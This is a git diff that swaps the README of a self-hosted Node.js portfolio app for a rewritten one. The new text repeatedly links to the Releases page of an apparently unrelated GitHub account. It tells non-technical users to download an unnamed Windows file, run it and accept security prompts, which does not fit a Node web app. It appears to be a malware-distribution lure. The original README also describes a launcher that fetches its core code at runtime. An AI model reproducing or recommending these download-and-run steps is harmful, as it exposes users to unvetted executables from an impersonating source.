@@ -1,255 +1,260 @@
-<div align="center">
+# 🌐 Advay-Portfolio-Website - Showcase Your Work With Ease
 
-<img src="https://img.shields.io/badge/Advay--Portfolio--Website-Latest-00e5ff?style=for-the-badge&logo=node.js&logoColor=white" alt="Advay Portfolio Website Latest" />
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-2D9CDB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases)
 
-# 🚀 Advay Portfolio Website
+## ✨ What this is
 
-### A full-featured developer portfolio and tools hub — self-hostable, CMS-driven, AI-powered.
+Advay-Portfolio-Website is a self-hosted personal portfolio and brand hub. It gives you one place to show your projects, live tools, GitHub repos, and contact details.
 
-[![Node.js](https://img.shields.io/badge/Node.js-18.x+-339933?style=flat-square&logo=node.js&logoColor=white)](https://nodejs.org)
-[![Supabase](https://img.shields.io/badge/Supabase-Database-3ECF8E?style=flat-square&logo=supabase&logoColor=white)](https://supabase.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/Advay254/Advay-Portfolio-Website/pulls)
-[![Deploy on Render](https://img.shields.io/badge/Deploy%20on-Render-46E3B7?style=flat-square&logo=render&logoColor=white)](https://render.com)
+It includes a CMS admin dashboard, an AI chat assistant, a hire me contact form, webhook alerts, and a moving color theme. It is made for people who want a clean site they can run on their own.
 
-<br/>
+## 📥 Download
 
-<a href="https://www.buymeacoffee.com/advay254" target="_blank">
-  <img src="https://img.shields.io/badge/Support%20Me-%E2%98%95%20Buy%20Me%20a%20Coffee-ffdd57?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black" alt="Buy Me A Coffee" />
-</a>
+Visit this page to download: https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases
 
-<br/><br/>
+Open the latest release and get the Windows file from there. If the release contains a setup file or app file, download and run that file on your PC.
 
-> Your portfolio. Your brand. Your tools. All in one self-hostable app.
+## 🖥️ What you can do with it
 
-<br/>
+- Show your projects in a clean layout
+- List GitHub repos and live demos
+- Add a personal bio and contact details
+- Use the CMS dashboard to update content
+- Let visitors chat with an AI helper
+- Collect hire-me messages through a form
+- Send webhook alerts when someone submits a form
+- Use automatic color theme rotation for a dynamic look
 
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=16&pause=1000&color=00E5FF&center=true&vCenter=true&width=600&lines=Portfolio+%7C+Tools+Hub+%7C+Personal+Brand;Full+CMS+Admin+Dashboard;AI+Chat+Assistant+Built+In;n8n+Webhook+Notifications;One-Time+Activation+%C2%B7+Deploy+Anywhere)](https://github.com/Advay254/Advay-Portfolio-Website)
+## 📦 What you need
 
-</div>
+- A Windows PC
+- A web browser
+- Internet access for the first setup
+- A GitHub account to get the release file
+- A Supabase account if you want to store data
+- A Groq API key if you want the AI chat assistant
 
----
+## 🚀 Getting Started
 
-## ✨ Features
+1. Open the download page: https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from the release assets
+4. If Windows asks for permission, choose Yes or Run
+5. Wait for the app to open or finish installing
+6. Follow the setup screen shown in your browser or app window
 
-<img align="right" width="380" src="https://media.giphy.com/media/qgQUggAC3Pfv687qPC/giphy.gif" alt="coding gif"/>
+## 🛠️ First-time setup
 
-- 🏠 **Dynamic Homepage** — Animated hero, 3D rotating stack labels, smooth theme rotation, particle canvas
-- 👤 **Profile & About** — Bio, avatar, skills, social links, specializations — all editable from admin
-- 🗂️ **GitHub Repos** — Public repo showcase with collapsible README previews
-- ⚡ **Live Tools** — Deployed tools grid with category filters
-- ⚙️ **n8n Templates** — Downloadable automation workflow templates showcase
-- 🤝 **Hire Me Form** — Contact form with service categories, quick info sidebar, intro text
-- 🤖 **AI Chat Assistant** — In-page chat powered by Groq (scoped to portfolio context only)
-- 💡 **Suggestion Box** — Floating visitor feedback widget
-- 🔧 **Admin Dashboard** — Hidden CMS at a secret URL — manage everything without touching code
-- 🔔 **n8n Webhook Notifications** — Instant alerts for new contact requests and suggestions
-- 💳 **License System** — One-time activation per deployment
-- 📊 **Page Views Tracking** — Built-in analytics visible from admin dashboard
+After you start the app, you may need to set a few values so the site can work for you.
 
-<br clear="right"/>
+### Basic site details
 
----
+Set things like:
 
-## 🗂️ Project Structure
+- Your name
+- Your job title
+- A short bio
+- Your email address
+- Links to your social profiles
+- Your project links
+- Your resume link
 
-```
-Advay-Portfolio-Website/
-├── index.js          # Launcher — fetches and starts the core engine
-├── package.json      # Launcher dependencies only
-├── .env.example      # Environment variable reference
-├── version.txt       # Current release version
-└── .gitignore
-```
+### CMS admin dashboard
 
-> The core application is loaded securely at runtime. This keeps the source lean and the deployment simple.
+The admin dashboard lets you change your site without editing files.
 
----
+You can use it to:
 
-## 🚀 Quick Start
+- Add or edit projects
+- Update text on the homepage
+- Change your links
+- Manage portfolio sections
+- Keep the site fresh without technical steps
 
-### 1. Fork or clone the repo
+### AI chat assistant
 
-```bash
-git clone https://github.com/Advay254/Advay-Portfolio-Website.git
-cd Advay-Portfolio-Website
-```
+If you turn on the chat assistant, visitors can ask about your work and services.
 
-### 2. Install dependencies
+To use it, connect:
 
-```bash
-npm install
-```
+- A Groq API key
+- Your chat settings
+- Your preferred assistant style
 
-### 3. Set up environment variables
+### Contact form and webhook alerts
 
-```bash
-cp .env.example .env
-```
+The hire-me form helps visitors contact you.
 
-Edit `.env` with your values:
+You can connect it to:
 
-```env
-DATABASE_URL=postgresql://postgres:[PASSWORD]@db.[PROJECT-REF].supabase.co:5432/postgres
-ADMIN_PATH=your-secret-admin-path
-ADMIN_USERNAME=admin
-ADMIN_PASSWORD=your-secure-password
-JWT_SECRET=your-long-random-secret
-GROQ_API_KEY=gsk_xxxxxxxxxxxxxxxxxxxx
-GROQ_MODEL=llama-3.3-70b-versatile
-SITE_NAME=YourSiteName
-```
+- Webhooks for instant alerts
+- Email or messaging tools that accept webhook calls
+- A backend service for form submissions
 
-### 4. Run
+### Data storage
 
-```bash
-npm start
-```
+If you want saved content, connect a Supabase project.
 
-Visit `http://localhost:3000` — you're live. 🎉
+Use it for:
 
----
+- Portfolio content
+- Admin data
+- Form submissions
+- Site settings
 
-## 🔑 Environment Variables
+## 🎨 Main features
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `DATABASE_URL` | ✅ **Yes** | PostgreSQL / Supabase connection string. Get from: Supabase → Project Settings → Database → URI |
-| `ADMIN_PATH` | ✅ **Yes** | Secret URL path for your admin dashboard. Example: `xk9m4a-panel` → admin at `/xk9m4a-panel` |
-| `ADMIN_USERNAME` | ✅ **Yes** | Admin login username |
-| `ADMIN_PASSWORD` | ✅ **Yes** | Admin login password — make it strong |
-| `JWT_SECRET` | ✅ **Yes** | Long random string for session signing. Generate at [randomkeygen.com](https://randomkeygen.com) |
-| `GROQ_API_KEY` | ✅ **Yes** | Powers the AI chat assistant. Get one free at [console.groq.com](https://console.groq.com) |
-| `GROQ_MODEL` | Recommended | Groq model name. Default: `llama-3.3-70b-versatile` |
-| `SITE_NAME` | Optional | Display name shown in the browser tab |
-| `PORT` | Auto | Set automatically by Render — do not set manually |
+### Modern portfolio layout
 
----
+The site is built to present your work in a clear way. It gives each project enough space for a short description, links, and live previews.
 
-## 🗄️ Database Setup (Supabase — Free Tier)
+### Automatic color theme rotation
 
-1. Create a free project at [supabase.com](https://supabase.com)
-2. Go to **Project Settings → Database → Connection string → URI**
-3. Copy the URI and set it as `DATABASE_URL` in your environment
-4. Done — all database tables are created automatically on first run. No SQL needed.
+The interface changes through a rotating set of colors. This keeps the site from looking flat and helps it feel alive.
 
----
+### Live tools and repo showcase
 
-## 🌐 Deploying to Production
+You can use the site as a brand hub, not just a resume page. That means you can place:
 
-### Render (recommended)
+- GitHub repositories
+- Deployed tools
+- Case studies
+- Services
+- Contact paths
 
-<img align="right" width="300" src="https://media.giphy.com/media/RbDKaczqWovIugyJmW/giphy.gif" alt="deploy gif"/>
+### Self-hosted setup
 
-1. Fork this repo to your GitHub account
-2. Go to [render.com](https://render.com) and create a new **Web Service**
-3. Connect your forked repo
-4. Set **Build Command:** `npm install`
-5. Set **Start Command:** `npm start`
-6. Add your environment variables under **Environment**
-7. Click **Deploy**
+You keep control of your own site. That makes it easier to own your content and shape the page the way you want.
 
-> Render free tier sleeps after 15 minutes of inactivity. Use [cron-job.org](https://cron-job.org) to ping `/health` every 10 minutes to keep it awake.
+## 🪟 Windows install steps
 
-<br clear="right"/>
+1. Open the Releases page: https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases
+2. Download the latest Windows file
+3. Open your Downloads folder
+4. Double-click the downloaded file
+5. If Windows shows a security prompt, choose Run or Open
+6. Follow the on-screen steps
+7. Open your browser if the app starts a local web page
+8. Keep the app running while you set up your portfolio
 
-### Railway
+If the release gives you a zip file:
 
-```bash
-npm install -g @railway/cli
-railway login && railway init && railway up
-```
+1. Right-click the zip file
+2. Choose Extract All
+3. Open the extracted folder
+4. Run the app file inside it
 
-Add your environment variables in the Railway dashboard under **Variables**.
+## ⚙️ Common setup values
 
-### Any VPS (Ubuntu/Debian)
+Use these as a guide when you fill in the app settings:
 
-```bash
-curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
-sudo apt-get install -y nodejs
-git clone https://github.com/Advay254/Advay-Portfolio-Website.git
-cd Advay-Portfolio-Website && npm install
-npm install -g pm2
-pm2 start index.js --name advay-portfolio
-pm2 save && pm2 startup
-```
+- Site title: your name or brand
+- Tagline: a short line that says what you do
+- Hero text: a quick intro about your work
+- Projects: 3 to 6 strong items
+- Repos: your main GitHub links
+- Contact email: the address you check often
+- Resume: a PDF or external link
+- Theme: choose your preferred color style
 
----
+## 🔐 Admin access
 
-## 🛠️ How It Works
+If the app includes an admin login, set a strong password and keep it private.
 
-```
-User deploys Advay Portfolio Website
-        ↓
-Launcher starts and fetches the core engine securely at runtime
-Core engine extracts and installs its own dependencies
-        ↓
-App starts — all pages and admin dashboard are ready
-        ↓
-Admin visits /{ADMIN_PATH} and logs in
-Sets up profile, tools, repos, settings from the dashboard
-        ↓
-Visitors browse the portfolio, use the contact form, chat with the AI assistant
-        ↓
-New contact requests and suggestions fire instant webhook notifications
-to your n8n instance — no need to log in to check manually
-```
+Good password habits:
 
----
+- Use a long password
+- Do not reuse old passwords
+- Store it in a password manager
+- Change it if other people have seen it
 
-## 📊 Tech Stack
+## 🌍 Browser use
 
-<div align="center">
+The app is made to work well in a browser. You can use it to:
 
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white)
-![Express](https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white)
-![Supabase](https://img.shields.io/badge/Supabase-3ECF8E?style=for-the-badge&logo=supabase&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-4169E1?style=for-the-badge&logo=postgresql&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind_CDN-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white)
-![Groq](https://img.shields.io/badge/Groq-AI-F55036?style=for-the-badge)
-![Cloudflare Workers](https://img.shields.io/badge/Cloudflare_Workers-F38020?style=for-the-badge&logo=cloudflare&logoColor=white)
-![Render](https://img.shields.io/badge/Render-46E3B7?style=for-the-badge&logo=render&logoColor=white)
+- View your public portfolio
+- Edit your content in the dashboard
+- Test the chat assistant
+- Check contact form submissions
+- Review webhook activity
 
-</div>
+## 🧩 Suggested content blocks
 
----
+If you are building your portfolio for the first time, add these blocks:
 
-## 🔄 Updates
+- About section
+- Featured projects
+- Skills or tools
+- Services
+- Testimonials
+- Contact form
+- Social links
+- Resume download
+- Live demo links
 
-Check `version.txt` for the latest release version. Sync your fork and redeploy on Render to get the latest update automatically.
+## 🔄 Updating your site
 
----
+When you want to change your site, open the admin dashboard and edit the content there.
 
-## 🤝 Contributing
+Typical updates include:
 
-1. Fork the repo
-2. Create your branch: `git checkout -b feature/your-feature`
-3. Commit: `git commit -m 'Add your feature'`
-4. Push: `git push origin feature/your-feature`
-5. Open a Pull Request
+- New projects
+- New repo links
+- Updated work history
+- New contact details
+- New brand colors
+- New homepage text
 
----
+## 📱 Good display behavior
 
-## ⚠️ Disclaimer
+The layout is meant to work on:
 
-This project is provided for personal use and self-hosting. The author is not responsible for misuse or downtime of third-party services.
+- Desktop screens
+- Laptop screens
+- Tablet screens
+- Mobile browsers
 
----
+If the page feels cramped on a small screen, reduce the amount of text in each section and keep project cards short.
 
-## 📄 License
+## 🧪 Best use cases
 
-MIT © 2026 Advay — free to use, modify, and distribute.
+This app fits well if you want to:
 
----
+- Build a personal portfolio
+- Show freelance services
+- Share a developer brand hub
+- Present live web tools
+- Collect job inquiries
+- Keep your public presence in one place
 
-<div align="center">
+## 🛟 If something does not open
 
-![Visitor Count](https://visitor-badge.laobi.icu/badge?page_id=Advay254.Advay-Portfolio-Website)
+Try these steps:
 
-**If this saved you time, drop a ⭐ — it helps others find the project.**
+1. Check that the file finished downloading
+2. Move the file to your Desktop
+3. Run it again
+4. Restart your computer
+5. Open the release page and download the latest file again
+6. Make sure your browser is up to date
 
-<br/>
+## 📝 Project details
 
-<a href="https://www.buymeacoffee.com/advay254" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;"></a>
+- Repository: Advay-Portfolio-Website
+- Type: personal portfolio and brand hub
+- Hosting style: self-hosted
+- Main focus: portfolio display and admin control
+- Extra tools: AI chat, contact form, webhook alerts, CMS
+- Target user: non-technical user who wants a polished public site
 
-</div>
+## 🔗 Download again
+
+[Open the latest release page](https://github.com/lowresolution-heavy482/Advay-Portfolio-Website/releases)
+
+## 🧭 What to do next
+
+1. Download the latest release
+2. Open the app on Windows
+3. Set your name, links, and projects
+4. Turn on the features you want
+5. Share your portfolio link with visitors
